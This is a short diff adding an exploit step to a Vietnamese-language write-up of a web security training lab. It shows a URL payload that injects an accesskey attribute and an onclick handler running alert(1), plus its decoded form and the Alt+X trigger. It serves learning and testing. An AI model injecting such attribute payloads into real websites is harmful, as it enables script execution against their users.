@@ -352,3 +352,15 @@ Alt+X
 Please note that the intended solution to this lab is only possible in Chrome.
 ```
 * Exploit:
+
+Truy cập link payload sau: `https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)`
+
+URL Decode: `https://YOUR-LAB-ID.web-security-academy.net/?'accesskey='x'onclick='alert(1)`
+
+Nhấn Alt+X => LAB SOLVED!
+
+![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/7247517e-6e5f-4b0b-9974-d24786f31312)
+
+***
+
+## 11. 
